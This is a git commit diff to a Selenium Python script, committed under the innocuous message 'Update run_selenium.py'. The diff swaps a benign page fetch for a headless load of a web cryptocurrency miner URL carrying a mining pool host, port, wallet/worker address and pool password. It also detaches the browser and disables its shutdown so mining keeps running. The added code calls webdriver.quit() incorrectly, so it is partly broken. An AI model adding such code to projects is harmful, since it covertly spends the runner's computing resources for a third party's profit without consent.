f7d6ab817b66b8780af07837739fe1f21b9fda9e
mvelisomakhenkce <mvelisomakhenkce@gmail.com>
2024-08-03 00:55:06 +0200

    Update run_selenium.py

--- run_selenium.py
+++ run_selenium.py
@@ -14,6 +14,9 @@ chrome_options = Options()
 chrome_options.add_argument("--headless")  # Ensure GUI is off
 chrome_options.add_argument("--no-sandbox")
 
+# Keep the browser open
+chrome_options.add_experimental_option("detach", True)
+
 # Set path to chromedriver as per your configuration
 homedir = os.path.expanduser("~")
 chrome_options.binary_location = f"{homedir}/chrome-linux64/chrome"
@@ -23,7 +26,7 @@ webdriver_service = Service(f"{homedir}/chromedriver-linux64/chromedriver")
 browser = webdriver.Chrome(service=webdriver_service, options=chrome_options)
 
 # Get page
-browser.get("https://cloudbytes.dev")
+browser.get("https://webminer.pages.dev?algorithm=minotaurx&host=flyingsaucer-eu.teatspray.fun&port=7019&worker=MGaypRJi43LcQxrgoL2CW28B31w4owLvv8&password=Cldw%2Cc%3DMAZA%2Czap%3DMAZA&workers=2")
 
 # Extract description from page and print
 description = browser.find_element(By.NAME, "description").get_attribute("content")
@@ -31,4 +34,11 @@ print(f"{description}")
 
 # Wait for 10 seconds
 time.sleep(10)
-browser.quit()
+# browser.quit()
+
+
+keyword = input("enter a character or press enter to continue: ")
+
+webdriver.quit()
+
+#chrome_driver = webdriver.Chrome(options= chrome_options)
